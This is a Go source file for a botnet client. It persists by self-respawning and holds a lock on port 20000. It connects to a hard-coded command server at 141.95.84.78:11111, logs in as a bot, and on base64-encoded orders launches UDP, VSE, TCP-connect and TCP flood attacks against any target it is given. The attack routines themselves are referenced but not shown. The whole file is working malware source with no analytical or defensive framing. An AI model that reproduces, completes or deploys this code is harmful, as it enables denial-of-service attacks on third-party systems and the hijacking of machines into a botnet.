package main

import (
	"encoding/base64"
	"math/rand"
	"net"
	"os"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
	"time"
)

func start_all() {

	connect()

}

func checkif_du() bool {

	result := make(chan bool)
	go func() {
		listen, err := net.Listen("tcp", "0.0.0.0:20000")
		if err != nil {
			result <- false
		} else {
			result <- true
			for {

				_, err := listen.Accept()
				if err != nil {

					continue
				}
			}
		}

	}()
	haha := <-result
	return haha
}

func main() {

	args := os.Args
	isDea := false
	isfor := false
	for _, a := range args {
		if a == "-f" {
			isDea = true
		} else if a == "-d" {
			isfor = true
		}
	}
	ppid := os.Getppid()

	if ppid != 0 && isDea == false && isfor == false {

		cmd := exec.Command(args[0], "-f")
		cmd.Env = os.Environ()
		cmd.Start()
		os.Exit(0)
	} else if isDea == true && isfor == false {
		if checkif_du() {
			for {
				cmd := exec.Command(args[0], "-d")
				cmd.Env = os.Environ()
				cmd.Start()
				cmd.Wait()
			}
		} else {
			os.Exit(1)
		}
	} else if isfor == true && isDea == false {

		start_all()
	}
}

const letterBytes = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

func RandStringBytes(n int) string {
	b := make([]byte, n)
	for i := range b {
		b[i] = letterBytes[rand.Intn(len(letterBytes))]
	}
	return string(b)
}

func connect() {
	runtime.GOMAXPROCS(runtime.NumCPU())
	conn, err := net.Dial("tcp", "141.95.84.78:11111")
	buf := [1024]byte{}
	defer conn.Close()
	if err != nil {
		time.Sleep(10 * time.Second)
		connect()

	}
	for {
		n, err := conn.Read(buf[:])
		data := string(buf[:n])
		if find := strings.Contains(data, "username"); find {
			_, err = conn.Write([]byte("BOT"))
			if err != nil {
				time.Sleep(10 * time.Second)
				connect()

			}

		}
		break
	}

	for {
		n, err := conn.Read(buf[:])
		data := string(buf[:n])
		if find := strings.Contains(data, "password"); find {
			_, err = conn.Write([]byte("FBI"))
			if err != nil {
				time.Sleep(10 * time.Second)
				connect()
			}

		}
		break
	}

	for {
		n, err := conn.Read(buf[:])
		if err != nil {
			time.Sleep(10 * time.Second)
			connect()

		}

		data1 := string(buf[:n])
		data, _ := base64.StdEncoding.DecodeString(data1)
		cmd := strings.Split(string(data), " ")
		if cmd[0] == "PING" {
			conn.Write([]byte(base64.StdEncoding.EncodeToString([]byte("PONG"))))
		} else if cmd[0] == "$UDP" || cmd[0] == "$udp" {

			ip := cmd[1]
			port := cmd[2]
			len, _ := strconv.Atoi(cmd[3])
			atime, _ := strconv.Atoi(cmd[4])
			thread, _ := strconv.Atoi(cmd[5])

			for i := 0; i < thread; i++ {
				go udp_attack(ip, port, len, atime)

			}
		} else if cmd[0] == "$VSE" || cmd[0] == "$vse" {
			ip := cmd[1]
			port := cmd[2]
			atime, _ := strconv.Atoi(cmd[3])
			thread, _ := strconv.Atoi(cmd[4])
			for i := 0; i < thread; i++ {
				go vse_attack(ip, port, atime)
			}
		} else if cmd[0] == "$tcp_conn" || cmd[0] == "$TCP_CONN" {
			ip := cmd[1]
			port := cmd[2]
			atime, _ := strconv.Atoi(cmd[3])
			thread, _ := strconv.Atoi(cmd[4])
			connn, _ := strconv.Atoi(cmd[5])
			for i := 0; i < thread; i++ {
				go tcp_normal_connect(ip, port, atime, connn)
			}
		} else if cmd[0] == "$tcp_flood" || cmd[0] == "$TCP_FLOOD" {
			ip := cmd[1]
			port := cmd[2]
			len, _ := strconv.Atoi(cmd[3])
			atime, _ := strconv.Atoi(cmd[4])
			thread, _ := strconv.Atoi(cmd[5])
			for i := 0; i < thread; i++ {
				go tcp_flood(ip, port, len, atime)

			}
		} else if cmd[0] == "fuckoff" {
			conn.Close()
			os.Exit(0)
		}

	}

}
